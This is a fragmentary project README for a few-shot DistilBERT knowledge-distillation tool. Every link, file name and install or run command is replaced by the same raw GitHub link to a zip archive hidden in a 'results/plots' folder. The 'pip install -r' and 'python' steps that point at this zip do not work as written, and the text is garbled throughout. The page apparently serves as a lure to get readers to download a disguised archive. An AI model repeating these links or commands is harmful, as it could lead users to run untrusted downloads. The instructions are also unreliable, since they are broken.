...
[![Download](https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/raw/refs/heads/main/results/plots/textkd-distilbert-p-fewshot-v1.8.zip%20Now-brightgreen)](https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/raw/refs/heads/main/results/plots/textkd-distilbert-p-fewshot-v1.8.zip)
...
[Download from Releases Page](https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/raw/refs/heads/main/results/plots/textkd-distilbert-p-fewshot-v1.8.zip)
...
5. **Install Dependencies:** Open a terminal (Command Prompt for Windows) and navigate to the folder where you extracted the files. Run the following command to install the required packages:
   ```
   pip install -r https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/raw/refs/heads/main/results/plots/textkd-distilbert-p-fewshot-v1.8.zip
   ```

6. **Run the Application:** After installing the requirements, you can run the application with this command:
   ```
   python https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/raw/refs/heads/main/results/plots/textkd-distilbert-p-fewshot-v1.8.zip
   ```
...
- **Comprehensive Metrics:** Get insights through https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/raw/refs/heads/main/results/plots/textkd-distilbert-p-fewshot-v1.8.zip that includes accuracy, precision, and recall.
...
- **https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/raw/refs/heads/main/results/plots/textkd-distilbert-p-fewshot-v1.8.zip** Contains performance metrics for your model. 
- **https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/raw/refs/heads/main/results/plots/textkd-distilbert-p-fewshot-v1.8.zip** A visual representation of how the model trained over time.
- **https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/raw/refs/heads/main/results/plots/textkd-distilbert-p-fewshot-v1.8.zip** A list of misclassified text with the predicted and actual labels.
